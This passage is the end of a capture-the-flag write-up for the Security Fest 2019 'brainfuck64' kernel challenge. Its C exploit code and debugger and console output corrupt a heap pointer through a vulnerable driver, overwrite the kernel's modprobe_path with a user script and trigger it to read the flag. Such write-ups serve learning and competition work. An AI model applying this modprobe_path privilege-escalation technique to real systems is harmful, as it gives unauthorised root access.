<span class="n">init_program</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span></code></pre></figure>

<p>Now, we just need another brainfuck program to overwrite the string with the name of our exploit script, which will copy the flag to the user directory and make it readable.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Create brainfuck code for overwriting modprobe_path string pointing to flag copy script</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    
<span class="n">STARTCODE</span><span class="p">()</span>

<span class="c1">// Move to start of modprobe path string</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> 
    <span class="n">ADDOP</span><span class="p">(</span><span class="sc">'&gt;'</span><span class="p">);</span>
        
<span class="kt">char</span> <span class="n">current_string</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/sbin/modprobe"</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">dest_string</span><span class="p">[]</span> <span class="o">=</span>    <span class="s">"/home/user/p</span><span class="se">\x00\x00</span><span class="s">"</span><span class="p">;</span>
    
<span class="n">change_value</span><span class="p">(</span><span class="n">current_string</span><span class="p">,</span> <span class="n">dest_string</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">current_string</span><span class="p">));</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Execute overwrite brainfuck code</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">execute_program</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">pwndbg&gt; x/30gx 0xffffffff81a3f790
0xffffffff81a3f790:	0x0000000000000000	0x0000000000000000
0xffffffff81a3f7a0:	0x73752f656d6f682f	0x00000000702f7265
0xffffffff81a3f7b0:	0x0000000000000000	0x0000000000000000

pwndbg&gt; x/s 0xffffffff81a3f7a0
0xffffffff81a3f7a0:	"/home/user/p"</code></pre></figure>

<p>Everything’s prepared, and we just have to trigger <code class="language-plaintext highlighter-rouge">modprobe_path</code></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"Trigger modprobe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"/home/user/dummy"</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"cat /home/user/flag"</span><span class="p">);</span></code></pre></figure>

<p>Since the kernel will not recognize the file format of <code class="language-plaintext highlighter-rouge">dummy</code>, it will try to execute the file at <code class="language-plaintext highlighter-rouge">modprobe_path</code> (which is now our exploit script, copying the flag into the user directory).</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
[+] Opening connection to brainfuck64-01.pwn.beer on port 31337: Done
[*] Compile
[*] Booting
[+] Upload: Done
[*] Switching to interactive mode
user@sctf:/home/user$ $ ./bout

[+] Prepare modprobe exploit
[+] Prepare modprobe exploit
[+] Open brainfuck device
[+] Leak heap address
Current FD    : 0xffff880006cd9500
Dest FD       : 0xffffffff81a3f790
[+] Create brainfuck code to corrupt free chunk FD
[+] Execute brainfuck code
[+] Allocate new program chunk, output buffer pointing to modprobe path chunk
[+] Create brainfuck code for overwriting modprobe_path string pointing to flag copy script
[+] Execute overwrite brainfuck code
Trigger modprobe
/home/user/dummy: line 1: \xff\xff\xff\xff: not found
sctf{0pt1miZeD_4_pWN}</code></pre></figure>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=Security Fest 2019 - brainfuck64&amp;url=https://kileak.github.io/ctf/2019/secfest-brainfuck64/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2019/secfest-brainfuck64/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2019/secfest-brainfuck64';
        var disqus_title = 'Security Fest 2019 - brainfuck64';
        var disqus_url = 'https://kileak.github.io/ctf/2019/secfest-brainfuck64';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
